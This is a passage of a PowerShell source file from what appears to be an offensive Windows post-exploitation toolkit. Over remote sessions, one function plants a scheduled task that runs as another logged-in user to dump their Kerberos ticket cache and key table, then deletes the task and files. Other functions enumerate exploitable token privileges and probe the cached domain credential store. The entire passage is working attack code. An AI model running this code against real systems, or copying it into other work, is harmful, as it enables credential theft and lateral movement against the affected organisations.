    $taskName = 'AutoRDPwnK' + (New-ARModuleToken -Length 6)
    try {
        $userName = [string](Invoke-ARRemote -Session $session -ArgumentList $Session -ScriptBlock {
            param($sessionId)
            $user = ''
            foreach ($line in @(& query.exe session 2>&1 | ForEach-Object { [string]$_ })) {
                $text = $line.Trim()
                if ($text -eq '') { continue }
                $tokens = @($text -split '\s+')
                for ($index = 1; $index -lt $tokens.Count; $index++) {
                    if ($tokens[$index] -ne $sessionId) { continue }
                    if ($index -ge 2) { $user = $tokens[$index - 1] }
                    break
                }
                if ($user -ne '') { break }
            }
            return $user
        })
        if ([string]::IsNullOrWhiteSpace($userName)) { throw ('No interactive user is attached to session ' + $Session + ' on the target.') }
        Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory, $remoteFile, $taskName, $userName -ScriptBlock {
            param($directory, $report, $name, $user)
            if (-not (Test-Path -LiteralPath $directory)) { New-Item -ItemType Directory -Path $directory -Force | Out-Null }
            $arguments = '/c klist > "' + $report + '" 2>&1 & klist -k >> "' + $report + '" 2>&1'
            $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument $arguments
            $principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Limited
            Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
            Start-ScheduledTask -TaskName $name -ErrorAction Stop
        } | Out-Null
        $script:ARRemoteTasks.Add($taskName)
        $text = ''
        $deadline = [DateTime]::UtcNow.AddSeconds(30)
        while ([DateTime]::UtcNow -lt $deadline) {
            Start-Sleep -Milliseconds 500
            $text = [string](Invoke-ARRemote -Session $session -ArgumentList $remoteFile -ScriptBlock {
                param($path)
                if (-not (Test-Path -LiteralPath $path)) { return '' }
                try { return (Get-Content -LiteralPath $path -Raw -ErrorAction Stop) } catch { return '' }
            })
            if (-not [string]::IsNullOrWhiteSpace($text)) { break }
        }
        if ([string]::IsNullOrWhiteSpace($text)) { throw ('klist produced no output in session ' + $Session + ' within 30 seconds.') }
        [System.IO.File]::WriteAllText($localFile, $text, [System.Text.Encoding]::UTF8)
        Write-ARSuccess ('Kerberos ticket cache of session ' + $Session + ' (' + $userName + ') saved to ' + $localFile)
        Set-ARStatus 'Kerberos ticket cache dumped' 'Ok'
    }
    finally {
        try {
            Invoke-ARRemote -Session $session -ArgumentList $taskName -ScriptBlock {
                param($name)
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
        [void]$script:ARRemoteTasks.Remove($taskName)
        try {
            Invoke-ARRemote -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
                param($path)
                Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
            } | Out-Null
        }
        catch { }
    }
}

function Invoke-ARAttackTokenPrivileges {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Token privilege enumeration'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $privileges = @()
        $privilegeExit = 0
        $groups = @()
        try {
            $privileges = @(& whoami.exe /priv 2>&1 | ForEach-Object { [string]$_ })
            $privilegeExit = $LASTEXITCODE
        }
        catch { $privilegeExit = -1 }
        try {
            $groups = @(& whoami.exe /groups 2>&1 | ForEach-Object { [string]$_ })
        }
        catch { }
        return [pscustomobject]@{ Privileges = $privileges; PrivilegeExit = $privilegeExit; Groups = $groups }
    }
    $wanted = @(
        'SeImpersonatePrivilege',
        'SeDebugPrivilege',
        'SeBackupPrivilege',
        'SeRestorePrivilege',
        'SeTakeOwnershipPrivilege'
    )
    Write-ARInfo ('Token privileges for ' + $target + ':')
    foreach ($name in $wanted) {
        $line = ''
        foreach ($candidate in @($result.Privileges)) {
            if ([string]$candidate -match ('^\s*' + [regex]::Escape($name) + '\b')) { $line = ([string]$candidate).Trim(); break }
        }
        if ($line -eq '') { Write-ARWarn ($name + ': not held') }
        else { Write-ARSuccess ($name + ': held -> ' + $line) }
    }
    Write-ARInfo ('whoami /priv exit code: ' + [string]$result.PrivilegeExit)
    Write-Host '--- whoami /priv ---' -ForegroundColor DarkGray
    foreach ($line in @($result.Privileges)) { Write-Host ([string]$line) -ForegroundColor Gray }
    Write-Host '--- whoami /groups ---' -ForegroundColor DarkGray
    foreach ($line in @($result.Groups)) { Write-Host ([string]$line) -ForegroundColor Gray }
    Set-ARStatus 'Token privileges enumerated' 'Ok'
}

function Invoke-ARAttackCachedLogons {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Cached logon inspection'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cachedCount = $null
        $countReadable = $false
        try {
            $cachedCount = [string](Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name 'CachedLogonsCount' -ErrorAction Stop).CachedLogonsCount
            $countReadable = $true
        }
        catch { }
        $cacheReadable = $false
        $entries = @()
        $reason = ''
        try {
            $key = Get-Item -LiteralPath 'HKLM:\SECURITY\Cache' -ErrorAction Stop
            $cacheReadable = $true
            $entries = @($key.GetValueNames() | Where-Object { $_ -match '^NL\$\d+$' } | Sort-Object)
        }
        catch { $reason = $_.Exception.Message }
        return [pscustomobject]@{
            CachedCount   = $cachedCount
            CountReadable = $countReadable
            CacheReadable = $cacheReadable
            Entries       = @($entries)
            Reason        = $reason
        }
    }
    if ([bool]$result.CountReadable) {
        Write-ARInfo ('CachedLogonsCount = ' + [string]$result.CachedCount)
        if ([string]$result.CachedCount -eq '0') { Write-ARInfo 'Domain cached credentials are disabled by policy on this target.' }
    }
    else { Write-ARWarn 'CachedLogonsCount could not be read from Winlogon.' }
    if ([bool]$result.CacheReadable) {
        $entries = @($result.Entries)
        Write-ARSuccess ('HKLM\SECURITY\Cache is readable and holds ' + [string]$entries.Count + ' cached credential slot(s).')
        if ($entries.Count -gt 0) { Write-ARInfo ('Slots: ' + ($entries -join ', ')) }
        else { Write-ARInfo 'The cache key is readable but currently has no NL$ slots.' }
    }
    else {
        Write-ARWarn ('HKLM\SECURITY\Cache is not readable from this context (it needs SYSTEM): ' + [string]$result.Reason)
    }
    Write-ARInfo 'Read-only: no value was written and nothing needs restoring.'
    Set-ARStatus 'Cached logon state inspected' 'Ok'
}